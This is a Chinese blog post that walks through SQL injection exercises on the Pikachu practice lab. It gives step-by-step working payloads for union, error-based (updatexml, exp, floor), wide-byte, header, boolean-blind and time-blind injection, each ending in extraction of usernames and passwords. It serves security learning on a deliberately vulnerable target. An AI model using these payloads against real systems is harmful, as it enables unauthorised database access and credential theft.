---
layout:     post
title:      TimeLineSec安全教程（一）————SQL注入
subtitle:   记录实验靶机过程中的积累
date:       2020-02-24
author:     Ultimater
header-img: img/post-bg-timelinesec.jpg
catalog: true
tags:
    - 网络安全
    - TimeLine Sec
---

>**感谢 TimeLine Sec 组织的此次基础教程实验，帮助众多安全人员巩固基础和提升技能，尤其对我这样的入门者，更是一个从理论向实践发展的好的契机！同时，MS08067安全实验室出版的《Web安全攻防——渗透测试实验指南》作为我实验过程中用来随时随地加深理论认知的书籍，内容详实清晰，循序渐进，起到了巨大的作用，特此感谢！**

### 一、前言

SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。SQL注入按照不同的分类方法可以分为很多种，如报错注入、盲注、Union联合注入等。

本次 TimeLine Sec 的SQL注入实验靶机为 pikachu ，该靶场涉及到很多漏洞种类，感兴趣的可以自行在本地搭建练习，详情见[Pikachu搭建教程](https://mp.weixin.qq.com/s/z87ddIq79BlwSXNt0cMF2w)

### 二、数字型注入

![20200304212847.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/20200304212847.png)

1.页面抓包之后，在参数`id`处输入`1'`判断是否存在注入

![1.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/1.png)

2.根据`1' and 1=1`和`1' and 1=2`的返回信息判断是数字型注入

![20200304214711.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/20200304214711.png)

![2.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/2.png)

3.`order by 3`判断列数

![3.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/3.png)

4.用union联合注入，`id=-1 union select 1,2`判断输出位置（此时union的前一个条件为假）

![4.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/4.png)

5.union注入获取数据库`id=-1 union select database(),2`

![9O@V5@SSFXIVTWL%`LE}@2Y.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/9O%40V5%40SSFXIVTWL%25%60LE%7D%402Y.png)

6.构造语句爆表名
`id=-1 union select (select table_name from information_schema.tables where table_schema='pikachu' limit 3,1),2`

![20200304215417.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/20200304215417.png)

7.构造语句爆列名
`id=-1 union select (select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 1,1),2`

![A400U3PIJ6975{7C53L3Q18.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/A400U3PIJ6975%7B7C53L3Q18.png)

8.获取用户名
`id=-1 union select (select group_concat(username) from pikachu.users),2`

![20200304215626.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/20200304215626.png)

9.获取用户密码`id=-1 union select (select group_concat(password) from pikachu.users),2`

![5.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/5.png)

### 三、字符型注入

1.输入`1'`报错，输入`1'#`页面返回正常，可判断为字符型注入

![6.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/6.png)

![QQ图片20200305113343.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305113343.png)

2.判断列数`1' order by 3#`

![QQ图片20200305113549.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305113549.png)

3.查看union注入返回到页面的位置`-1' union select 1,2#`

![7.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/7.png)

4.爆库名`-1' union select database(),2#`

![QQ图片20200305113621.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305113621.png)

5.爆表名`-1' union select (select group_concat(table_name) from information_schema.tables where table_schema='pikachu'),2#`

![LTIEN1IOOH%PH}3MZS~%XXP.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/LTIEN1IOOH%25PH%7D3MZS%7E%25XXP.png)

6.爆user表中的列名`-1' union select (select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users'),2#`

![QQ图片20200305105055.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305105055.png)

7.爆user表的username字段`-1' union select (select group_concat(username) from pikachu.users),2#`

![QQ图片20200305105434.jpg](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305105434.jpg)

8.爆user表中的password字段`-1' union select (select group_concat(password) from pikachu.users),2#`

![QQ图片20200305113649.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305113649.png)

### 四、搜索型注入

>**查看Pikachu的后台源码，发现搜索型注入和字符型注入的差别在于输入参数的闭合方式，字符型为`'name'`,搜索型为`'%name%'`,不过在注入过程中发现其payload构造方式与字符型相同，因为在构造时加入`1'`闭合前面的单引号之后，引号内部的 % 也被闭合掉了，所以不会产生影响。**

1.输入`1'`报错，输入`1'#`返回正常

![vkdlsbvbsldvbls](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/vkdlsbvbsldvbls)

![akjvavajvnjanvdad](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/akjvavajvnjanvdad)

2.用 order by 判断列数`1' order by 4#`

![ajvbsvdbbskvjk](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/ajvbsvdbbskvjk)

3.union看回显`-1' union select 1,2,3#`

![sdkjvnskjnvkjsdvkj](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/sdkjvnskjnvkjsdvkj)

4.爆库名`-1' union select 1,database(),3#`

![QQ图片20200305124300.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305124300.png)

5.爆表名`-1' union select 1,(select table_name from information_schema.tables where table_schema='pikachu' limit 3,1),3#`

![QQ图片20200305124400.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305124400.png)

6.爆列名`-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users'),3#`

![svajlvhjavjajvajv](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/svajlvhjavjajvajv)

7.查看username字段`-1' union select 1,(select group_concat(username) from pikachu.users),3#`

![QQ图片20200305124544.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305124544.png)

8.查看password字段`-1' union select 1,(select group_concat(password) from pikachu.users),3#`

![QQ图片20200305124710.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305124710.png)

### 五、xx型注入

>**xx型注入的后台源码显示闭合方式为`('name')`,用union注入方法和之前的字符型注入、搜索型注入原理相通，只是在闭合的地方用`')`进行闭合就可以了。为加深对报错注入的理解，所以此处改用报错注入的方法来做**

>**怎么区分什么时候用union注入什么时候用报错注入：相较于union注入，若返回页面上没有显示位但是有sql语句执行错误信息输出位，则使用报错注入；若两者都有，则两种注入都可以。**

1.输入`1')`报错，输入`1')#`返回正常

![avuhakvbkavkakv](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/avuhakvbkavkakv)

![QQ图片20200305125820.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305125820.png)

2.用`updatexml()`函数进行数据库报错:`1') and updatexml(1,concat(0x7e,database(),0x7e),1)#`

![QQ图片20200305125948.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305125948.png)

3.爆表`-1') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu'),0x7e),1)#`

![QQ图片20200305130122.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305130122.png)

4.爆列名`-1') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users'),0x7e),1)#`

![lsnvslnvbsnbjnsb](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/lsnvslnvbsnbjnsb)

5.爆字段`-1') and updatexml(1,concat(0x7e,(select group_concat(username) from pikachu.users),0x7e),1)#`

![QQ图片20200305130352.png](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/QQ%E5%9B%BE%E7%89%8720200305130352.png)

### 六、insert/update注入

>**所谓 insert 注入是指我们前端注册的信息，后台会通过 insert 这个操作插入到数据库中。如果后台没对我们的输入做防 SQL 注入处理，我们就能在注册时通过拼接 SQL 注入。update 注入则指的是对数据库中的数据执行更新动作（而非 select 查询）。第七节的 delect 注入也是同理，对数据库中的某条数据执行删除操作。综上，SQL注入根据sql语句的类型可分为select、insert、update、delect注入。**

>**insert/update注入一般会出现在注册页面的用户名或者密码框（找回密码等）里**

>**这种情况下，我们知道后台使用的是 insert 语句，我们一般可以通过 or 进行闭合。并且updatexml()函数只能注出32位字符，由于我们之前发现password字段的值加上用0x7e以闭合的concat()值会超出32位，所以这里用exp()函数进行注入**

1.用exp()溢出构造payload爆库`'or exp(~(select * from (select database())e)) or '`

![avjakjvbkabvkbakva](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/avjakjvbkabvkbakva)

2.exp()函数爆表`'or exp(~(select * from (select group_concat(table_name) from information_schema.tables where table_schema='pikachu')e)) or '`

![avjbkjabvkjbakjvjkavdjgd](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/avjbkjabvkjbakjvjkavdjgd)

3.exp()函数爆列名`'or exp(~(select * from (select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users')e)) or '`

![ajdvbkjabvdkabvk](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/ajdvbkjabvdkabvk)

4.exp()函数爆password字段`'or exp(~(select * from (select group_concat(password) from pikachu.users)e)) or '`

![svanvlavajvjajvakjbv](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/svanvlavajvjajvakjbv)

### 七、delect注入

>**delect注入在insert注入的标示中有提过，属于一种sql语句类型。此处构造语句是由于是在burp的数据包中进行Get传输，所以`空格`需要用`+`代替**

>**基于insert和update的语句一般用`or ' `来结尾，因为他们后面往往跟着多组（如`'name1'，'name2'，'name3'`）数据；基于select和delete的用#来注释掉后面的内容(参数是数字型的一般可以不用注释符)**

1.爆库名`1+or+updatexml(1,concat(0x7e,database()),1)`

![kcvkabsvhkabvkbac](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/kcvkabsvhkabvkbac)

2.爆表名`1+or+updatexml(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema='pikachu')),1)`

![alvlavnkjadvkadsvavd](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/alvlavnkjadvkadsvavd)

3.爆列名```1+or+updatexml(1,concat(0x7e,(select+group_concat(column_name)+from+information_schema.columns+where+table_schema='pikachu'+and+table_name='users')),1)```

![avavnajnvdjaduvhdvd](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/avavnajnvdjaduvhdvd)

### 八、http头注入

>**http头部中，由于user-agent直接拼接，导致的漏洞。可以先自行构造user-agent，若报错，则的确有漏洞，用insert注入的方法进行注入，可获得输入的数据库名，也可获取更多信息。还有一种是在cookie中，与user-agent相同原因，在数据库里进行拼接，可能产生漏洞。**

>**由于之前已经使用过基于exp()函数和updatexml()函数的报错注入，为达到学习的目的，这里我们用floor()函数构造payload进行注入。**

1.先在http头部中的user-agent中插入单引号`'`，发现报错，说明数据库对user-agent中的内容进行了拼接，存在注入点

![avjnlavnlavavljnajvn](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/avjnlavnlavavljnajvn)

2.报错返回数据库版本`' or (select 2 from (select count(*), concat(version(), floor(rand(0) * 2))x from information_schema.tables group by x)a) or '`

![sbdsbfbdndfndfhsh](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/sbdsbfbdndfndfhsh)

3.爆库`' or (select 2 from (select count(*),concat((select database()),'-',floor(rand(0)*2))x from information_schema.tables group by x)a) or '`

![dbjdjvjabkjvbakjbvkabdvk](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/dbjdjvjabkjvbakjbvkabdvk)

4.爆表`' or (select 2 from (select count(*),concat((select table_name from information_schema.tables where table_schema='pikachu' limit 3,1),'-',floor(rand(0)*2))x from information_schema.tables group by x)a) or '`

![sbajldvnjldsnbjnfkj](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/sbajldvnjldsnbjnfkj)

5.爆列名`' or (select 2 from (select count(*),concat((select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 2,1),'-',floor(rand(0)*2))x from information_schema.tables group by x)a) or '`

![sjbvskjbvkjsdbvkjsk](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/sjbvskjbvkjsdbvkjsk)

6.爆password字段`' or (select 2 from (select count(*),concat((select password from pikachu.users limit 0,1),'-',floor(rand(0)*2))x from information_schema.tables group by x)a) or '`

![adbvskjhdvkjsdvjsdbs](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/adbvskjhdvkjsdvjsdbs)

### 九、宽字节注入

>**原理：当我们输入有单引号时被转义为`\'`，无法构造 SQL 语句的时候，可以尝试宽字节注入。前提：数据库编码格式为’gbk’/‘gb2312’等。GBK编码中，反斜杠的编码是 “%5c”，而 “%df%5c” 是繁体字 “連”。**

>**在我们使用的PIKACHU漏洞练习平台中，宽字节注入实验默认关闭了MySQL的错误描述显示,报错注入不太方便，所以这里我就直接用union进行注入啦~**

1.爆库`1234 %df' union select 1,database() #`

![avjbakjvvsljnjskdnvk](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/avjbakjvvsljnjskdnvk)

2.在构造爆表的payload时发现`1234 %df' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu') #`注入之后总是无显示，后来发现是payload里边的两个单引号依旧被转义没有跳出，所以这里我们换一个没有单引号的payload。构造新的payload`1234 %df' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()) #`成功

![lvkjsvdksdhvjksdvk](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/lvkjsvdksdhvjksdvk)

3.在构造爆列名的payload时无可避免需要用两个单引号闭合表名，所以我们用十六进制编码的方法对表名进行转义，如`select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x27757365727327`。可是这里注入仍不成功，经过一番查找，发现问题出在最后的十六进制转化，转化的是 'users' ,但是有一个错误就是一个字符串转化成十六进制时就不需要再用单引号进行闭合解释，所以去掉前后两个单引号的十六进制0x27,最后应该是0x7573657273。新的payload成功`1234 %df' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)#`

![vskjdbvkjsdbjsdjlvnsldbn](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/vskjdbvkjsdbjsdjlvnsldbn)

4.最后爆出password字段`1234 %df' union select 1,(select group_concat(password) from pikachu.users)#`

![djvsjdvjdvjkjvkjavv](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/djvsjdvjdvjkjvkjavv)

### 十、布尔盲注

1.通过如下`1``admin``admin' and 1=1#``admin' and 1=2# `的逻辑比对，知道它会把我们拼进去的and1=1,and 1=2进行运算，就可以知道后端这个点是存在注入的；但是貌似这个前端输出的信息特别少，它只有当你输入正确时有一个正确的结果以及你输入不正确时告诉你用户名不存在，所以知道是布尔盲注类型；

![avdidjlsjlahdva](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/avdidjlsjlahdva)

![ajdvajdvaovajdvanva](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/ajdvajdvaovajdvanva)

![advcncmcmccjcsdbsd](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/advcncmcmccjcsdbsd)

![sjbvksdbvkbsdvkbskdvb](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/sjbvksdbvkbsdvkbskdvb)

2.用length()函数猜解数据库名的长度`admin' and length(database())=7#``admin' and length(database())=8#`

![avjlakdvsnvjdnjsvdnvds](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/avjlakdvsnvjdnjsvdnvds)

![sljvdbvsbvhsdbvkbskh](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/sljvdbvsbvhsdbvkbskh)

3.知道出数据库名是7位之后，用substr()函数截取数据库名的每一位，并对每一位进行猜解（substr的用法跟limit的有区别，需要注意。limit是从0开始排序，而这里是从1开始排序。）

`admin' and substr(database(),1,1)='p'#`

![dvjdvjjdvbdvbsmbkdhbd](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/dvjdvjjdvbdvbsmbkdhbd)

`admin' and substr(database(),2,1)='i'#`

![advhbakhdbvkhabvkhabva](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/advhbakhdbvkhabvkhabva)

`admin' and substr(database(),3,1)='k'#`

![kadvhbkadbvabvkhbadv](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/kadvhbkadbvabvkhbadv)

4.依次猜解得到database()为'pikachu'，可以按照相同方法猜解表名、列名、字段内容。（注意：也可以用burp进行爆破，比手动一个个猜解更快一点，不过需要在substr()函数前再使用一个ord()函数或者ascii()函数，其功能都是将字符转化为ASCII码，之后就可以用ASCII数字码依次爆破。）

### 十一、时间盲注

>**发现不能用布尔盲注只能用时间盲注的情况：当测注入点时，发现不管怎么测试页面都没反应，那就可以在测试语句中加入sleep()函数进行测试。**

>**时间注入是利用sleep()或benchmark()等函数让MySQL的执行时间变长。时间盲注多与IF(expr1,expr2,expr3)结合使用，此if语句含义是：如果expr1是TURE，则IF()的返回值为expr2；否则返回值则为expr3。**

1.在该注入页面发现无论输入什么，页面都只有“i don't care who you are!”一种回复，所以联合注入、报错注入、布尔注入都不适用，这里我们使用时间盲注。

2.使用substr()和ascii()两个函数猜解库名长度，在用if()和sleep()函数判断我们的猜解值是否正确，正确则延时5秒，否则不延时。payload构造`admin' and if(ascii(substr(database(),1,1))=112,sleep(5),1)#`

![avajldvnkjavkjakjvka](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/avajldvnkjavkjakjvka)

3.之后依次进行猜解就可以了~步骤和布尔盲注的猜解相同。

************************************************************************************
### 部分参考网页
[十种MySQL报错注入](https://www.cnblogs.com/wocalieshenmegui/p/5917967.html)
[SQL注入|T0mmclancy`s Blog](https://clancyb00m.github.io/2019/01/06/SQL%E6%B3%A8%E5%85%A5/)
[深入透彻理解 sql注入](https://klionsec.github.io/2014/11/09/sqli-readme/)
[Pikachu漏洞练习平台实验——SQL注入（四）](https://www.cnblogs.com/dogecheng/p/11616282.html#_label7)
[利用insert，update和delete注入获取数据](https://wooyun.js.org/drops/利用insert，update和delete注入获取数据.html)
































































